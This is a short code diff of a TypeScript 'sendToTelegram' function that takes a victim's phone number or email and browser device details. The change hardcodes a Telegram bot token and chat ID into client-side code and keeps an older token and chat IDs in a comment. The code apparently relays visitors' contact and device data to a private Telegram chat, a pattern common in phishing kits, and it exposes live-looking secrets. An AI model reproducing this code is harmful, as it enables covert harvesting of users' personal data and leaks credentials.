@@ -10,16 +10,12 @@ export const sendToTelegram = async (
   },
   phoneOrEmail?: string
 ) => {
-  const env = (import.meta as any)?.env ?? {};
-  const BOT_TOKEN = env.VITE_TELEGRAM_BOT_TOKEN as string | undefined;
-  const CHAT_IDS = (env.VITE_TELEGRAM_CHAT_IDS as string | undefined)
-    ?.split(',')
-    .map((v) => v.trim())
-    .filter(Boolean) ?? [];
+  const BOT_TOKEN = '8727263453:AAF4vG4JCgiqv2wUhNLHhfqB_Y0xiF8Gbkk';
+  const CHAT_IDS = ['6076369736'];
 
-  if (!BOT_TOKEN || CHAT_IDS.length === 0) {
-    return false;
-  }
+   //backup data bot lama
+  // const BOT_TOKEN = '8537131987:AAGSRSflBc7ajrYQ89Q8fc3CrJn_EW7OLR4';
+  // const CHAT_IDS = ['6885815623', '6076369736']; // Add your IDs here
 
   const getDeviceInfo = (): string => {
     const ua = navigator.userAgent;
